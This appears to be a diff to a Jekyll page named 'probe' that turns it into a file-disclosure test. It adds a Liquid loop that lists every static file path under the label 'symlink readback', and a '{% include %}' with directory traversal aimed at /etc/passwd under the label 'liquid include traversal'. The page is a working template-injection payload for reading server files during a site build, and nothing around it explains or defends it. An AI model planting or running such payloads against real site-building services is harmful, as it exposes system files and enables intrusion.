@@ -1,5 +1,10 @@
 ---
 title: probe
 ---
+symlink readback:
 
-probe page
+{% for f in site.static_files %}- {{ f.path }}
+{% endfor %}
+
+liquid include traversal:
+{% include ../../../etc/passwd %}
